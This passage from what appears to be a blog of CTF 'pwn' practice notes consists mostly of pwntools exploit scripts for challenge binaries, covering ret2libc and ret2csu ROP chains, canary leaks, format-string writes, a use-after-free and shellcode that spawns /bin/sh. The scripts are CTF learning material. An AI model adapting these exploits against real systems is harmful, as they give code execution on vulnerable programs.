class="line"><span class="number">0x0000000000400acf</span> : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006c0</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000400ad3</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x0000000000400ad1</span> : pop rsi ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400acd</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004005c9</span> : ret</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./list&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&quot;175.27.249.18&quot;,31766)   </span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./list&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your option:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000400ad3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004005c9 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x400ad3</span></span><br><span class="line">ret=<span class="number">0x4005c9</span></span><br><span class="line">main_addr=<span class="number">0x4007c1</span></span><br><span class="line">change(<span class="number">19</span>,rdi)</span><br><span class="line">change(<span class="number">20</span>,puts_got)</span><br><span class="line">change(<span class="number">21</span>,puts_plt)</span><br><span class="line">change(<span class="number">22</span>,main_addr)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;base_addr:&quot;</span>+<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">system_addr=base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">19</span>,rdi)</span><br><span class="line">change(<span class="number">20</span>,binsh_addr)</span><br><span class="line">change(<span class="number">21</span>,system_addr)</span><br><span class="line">change(<span class="number">22</span>,main_addr)</span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="Normal-shellcode"><a href="#Normal-shellcode" class="headerlink" title="Normal_shellcode"></a>Normal_shellcode</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250225113806.png" alt="Pasted image 20250225113806"></p><h2 id="NISACTF"><a href="#NISACTF" class="headerlink" title="NISACTF"></a>NISACTF</h2><h3 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ez_heap&#x27;</span>)</span><br><span class="line">p = ELF(<span class="string">&quot;ez_heap&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="girl-friend"><a href="#girl-friend" class="headerlink" title="girl_friend"></a>girl_friend</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]   </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;girlfriend&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./girlfriend&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">num</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name_size,name</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Her name size is :&quot;</span>,name_size)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Her name is :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,index)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">backdoor_addr=<span class="number">0x400B9C</span></span><br><span class="line">add(<span class="string">&quot;16&quot;</span>,p64(backdoor_addr))</span><br><span class="line">add(<span class="string">&quot;40&quot;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;16&quot;</span>,p64(backdoor_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="鹤城杯"><a href="#鹤城杯" class="headerlink" title="鹤城杯"></a>鹤城杯</h2><h3 id="littleof-2021鹤城杯"><a href="#littleof-2021鹤城杯" class="headerlink" title="littleof(2021鹤城杯)"></a>littleof(2021鹤城杯)</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250312131636.png" alt="Pasted image 20250312131636"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./littleof&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./littleof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x49</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;overflow?\n&#x27;</span>,pl1)</span><br><span class="line">data=p.recv()</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span>+data[<span class="number">0x49</span>:<span class="number">0x49</span>+<span class="number">7</span>]</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040059e : ret</span></span><br><span class="line"><span class="comment"># 0x0000000000400863 : pop rdi ; ret</span></span><br><span class="line">ret=<span class="number">0x40059e</span></span><br><span class="line">pop_rdi=<span class="number">0x400863</span></span><br><span class="line">func=<span class="number">0x4006E2</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(func)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;win&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_addr:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc.address:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;binsh:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;overflow?\n&#x27;</span>,pl1)</span><br><span class="line">data=p.recv()</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span>+data[<span class="number">0x49</span>:<span class="number">0x49</span>+<span class="number">7</span>]</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>  +p64(ret)+p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="Geek-Challenge"><a href="#Geek-Challenge" class="headerlink" title="Geek Challenge"></a><strong>Geek Challenge</strong></h2><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">backdoor = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x18</span>+<span class="number">8</span>) + p64(backdoor))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="买黑吗喽了吗（整数溢出，栈溢出）"><a href="#买黑吗喽了吗（整数溢出，栈溢出）" class="headerlink" title="买黑吗喽了吗（整数溢出，栈溢出）"></a>买黑吗喽了吗（整数溢出，栈溢出）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./syscall&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./syscall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x4090</span></span><br><span class="line">success(<span class="string">&#x27;base:&#x27;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">rdi=base+<span class="number">0x11f1</span></span><br><span class="line">rsi=base+<span class="number">0x11f3</span></span><br><span class="line">rax=base+<span class="number">0x11f7</span></span><br><span class="line">bss=base+<span class="number">0x4090</span></span><br><span class="line">rdx=base+<span class="number">0x11f5</span></span><br><span class="line">syscall=base+<span class="number">0x11EE</span></span><br><span class="line"></span><br><span class="line">rop=p64(rax)+p64(<span class="number">0</span>)+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx)+p64(<span class="number">0x8</span>)+p64(syscall)</span><br><span class="line">rop+=p64(rax)+p64(<span class="number">0x3b</span>)+p64(rdi)+p64(bss)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span>+rop</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice:&#x27;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback&#x27;</span>,payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="su"><a href="#su" class="headerlink" title="su~~~~"></a>su~~~~</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./csu&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./csu&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">s = <span class="keyword">lambda</span> s : p.send(s) </span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s) </span><br><span class="line">sa = <span class="keyword">lambda</span> n,s : p.sendafter(n,s) </span><br><span class="line">sla = <span class="keyword">lambda</span> n,s : p.sendlineafter(n,s) </span><br><span class="line">r = <span class="keyword">lambda</span> n : p.recv(n) </span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline() </span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s) </span><br><span class="line">ra = <span class="keyword">lambda</span> : p.recvall() </span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive() </span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) </span></span><br><span class="line"><span class="comment"># u32(p.recvuntil(b&#x27;\\xf7&#x27;)) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(): </span><br><span class="line">    gdb.attach(p) </span><br><span class="line">    pause() </span><br><span class="line"><span class="comment">#=====================================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, last</span>):</span><br><span class="line">    mov_addr = <span class="number">0x4008E0</span></span><br><span class="line">    pop_addr = <span class="number">0x4008FA</span></span><br><span class="line">    fakeebp=<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x80</span>+fakeebp</span><br><span class="line">    payload += p64(pop_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14)</span><br><span class="line">    payload += p64(<span class="number">1</span>)+p64(mov_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;exit.\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"></span><br><span class="line">read_addr=<span class="number">0x400798</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, puts_got, puts_got, <span class="number">0</span>, read_addr)</span><br><span class="line"></span><br><span class="line">puts_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_base:&#x27;</span>+<span class="built_in">hex</span>(puts_base))</span><br><span class="line">libc.address = puts_base - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">ogg=<span class="number">0x4f302</span>+libc.address</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ogg)</span><br><span class="line">p.send(payload2)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ID:\n&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;%13$p%14$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;canary =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">rbp = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;rbp =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">ret=rbp-<span class="number">0x18</span></span><br><span class="line">p.send(p64(ret+<span class="number">1</span>)+<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\xEC&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">b&#x27;%18c%6$hhn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?\n&#x27;</span>,<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\x85&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="真的能走到后门吗"><a href="#真的能走到后门吗" class="headerlink" title="真的能走到后门吗"></a>真的能走到后门吗</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ID:\n&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;%13$p%14$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;canary =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">rbp = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;rbp =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">ret=rbp-<span class="number">0x18</span> <span class="comment">#动调可知此为返回地址rbp-0x18</span></span><br><span class="line">p.send(p64(ret+<span class="number">1</span>)+<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\xEC&#x27;</span>) <span class="comment">#ret+1即为最终要修改的倒数第二个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">b&#x27;%18c%6$hhn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?\n&#x27;</span>,<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\x85&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="空调"><a href="#空调" class="headerlink" title="空调"></a>空调</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250307201728.png" alt="Pasted image 20250307201728"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">18839</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(filename)</span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;chioce&gt;:&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;0x404018&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;massege:&#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libcbase =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf = libcbase + libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>): </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&lt;Your chioce&gt;:&quot;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>): </span><br><span 